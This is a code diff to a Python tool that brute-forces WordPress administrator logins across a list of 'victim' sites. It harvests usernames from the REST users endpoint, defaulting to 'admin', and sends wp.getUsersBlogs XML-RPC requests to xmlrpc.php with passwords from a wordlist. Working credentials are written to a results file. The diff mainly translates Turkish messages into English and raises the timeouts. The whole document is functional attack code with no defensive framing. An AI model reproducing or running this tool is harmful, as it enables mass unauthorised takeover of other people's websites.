@@ -6,7 +6,7 @@ def fetching_user(url):
 	print(colored("[{}][*] Site: {}".format(local_time(),url), "blue"))
 	user_list = []
 	try:
-		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=1).content.decode('utf-8')
+		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=5).content.decode('utf-8')
 		try:
 			print
 			for x in json.loads(req):
@@ -15,7 +15,7 @@ def fetching_user(url):
 			print
 		
 	except Exception as e:
-		pass
+		print
 
 	return user_list
 def check_array(arr): 
@@ -29,7 +29,7 @@ def local_time():
 	current_time = time.strftime("%H:%M:%S", t)
 	return current_time
 def save(format):
-	s = open("sonuc.txt", "a+")
+	s = open("brute-force-result.txt", "a+")
 	s.write(format+"\n")
 
 def exploit(url, user_url, list_password):
@@ -37,17 +37,16 @@ def exploit(url, user_url, list_password):
 		payloads = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(user_url, list_password)
 
 		headers = {'Content-Type':'text/xml'}
-		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=0.5)
+		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=15)
 		if "isAdmin" in str(r.content):
-			print(colored("[{}][+] User: [{}] pass: [{}] site: {} ".format(local_time(),user_url,list_password,url), "green"))
-			save("User: [{}] pass: [{}] site: {}".format(user_url,list_password,url))
-				pass
+			print(colored("[{}][+] User [{}] Pass: [{}] Site: {} ".format(local_time(),user_url,list_password,url), "green"))
+			save("UseR: [{}] pass: [{}] site: {}".format(user_url,list_password,url))
 		else:
-			print("WP")
+			print(colored("[{}][-] Site: {} User: {} Pass: {}".format(local_time(),url,user_url, list_password), "red"))
 	except requests.exceptions.ConnectionError as e:
-		pass
+		print
 	except Exception as e:
-			pass
+			print
 
 def brute_url(url):
 	try:
@@ -57,7 +56,7 @@ def brute_url(url):
 			for username in username_url:
 				user.append(username)
 		else:
-			print(colored('[{}][+] [admin]'.format(local_time()), "green"))
+			print(colored('[{}][+] try With default username [admin]'.format(local_time()), "green"))
 			user.append("admin")
 
 		password = "wl.txt"
@@ -71,24 +70,24 @@ def brute_url(url):
 
 			user.clear()
 	except requests.exceptions.ConnectionError as e:
-		pass
+		print
 	except Exception as e:
-		pass
+		print
 
 def main():
  	try:
- 		parser = argparse.ArgumentParser(description='Wp Tarama')
- 		parser.add_argument("--list", help="Site listesi", required=True)
+ 		parser = argparse.ArgumentParser(description='Multiple Brute Force XMLRPC [Wordpress]')
+ 		parser.add_argument("--list", help="List website victim", required=True)
  		args = parser.parse_args()
  		try:
  			with open(args.list, "r") as victim:
- 				print(colored("[+] Tarama basladi {}".format(local_time()), "yellow"))
+ 				print(colored("[+] Start Brute Force on {}".format(local_time()), "yellow"))
  				for sites in victim:
  					url = sites.rstrip()
  					brute_url(url)
- 				print(colored("[+] Tarama bitti. {}".format(local_time()), "yellow"))
+ 				print(colored("[+] End Brute Force on {}".format(local_time()), "yellow"))
  		except IOError as e:
- 			print("[{}][!] Site listesi bulunamadi !".format(local_time()))
+ 			print("[{}][!] List website victim not exist !".format(local_time()))
  			sys.exit()
  	except KeyboardInterrupt as e:
  		print("[{}][!] Exit Program".format(local_time()))
